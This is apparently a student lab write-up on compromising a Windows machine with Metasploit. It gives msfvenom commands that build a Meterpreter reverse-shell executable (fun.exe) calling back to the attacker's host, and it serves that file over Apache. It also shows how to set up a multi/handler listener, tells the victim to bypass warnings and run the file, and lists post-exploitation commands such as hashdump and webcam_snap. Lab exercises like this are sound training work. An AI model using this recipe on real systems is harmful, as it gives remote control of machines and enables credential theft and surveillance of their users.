# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="822" height="338" alt="image" src="https://github.com/user-attachments/assets/cb3fe711-abe6-489a-a7c9-3d1a8df04830" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

<img width="960" height="146" alt="image" src="https://github.com/user-attachments/assets/38b403c2-2d9e-409a-bc52-d3bdeb5e7b95" />


copy the fun.exe into the apache ```/var/www/html ```folder

<img width="447" height="91" alt="image" src="https://github.com/user-attachments/assets/27635df4-f2c4-46b4-87dc-4fa68c091868" />


Start apache server ```sudo systemctl apache2 start``` 


<img width="819" height="217" alt="image" src="https://github.com/user-attachments/assets/907eda9d-f52d-49a9-9182-0fc21b94eed3" />

Check the status of apache2 ```sudo apache2 status```
<img width="1129" height="705" alt="image" src="https://github.com/user-attachments/assets/d218edd3-92db-4a25-ba22-1373739560eb" />


Invoke msfconsole:
<img width="1193" height="874" alt="image" src="https://github.com/user-attachments/assets/eb898d0d-9c03-4ff5-b763-481988581345" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="870" height="221" alt="image" src="https://github.com/user-attachments/assets/8af165cd-c95b-4ecf-9297-a95c4ad646f6" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

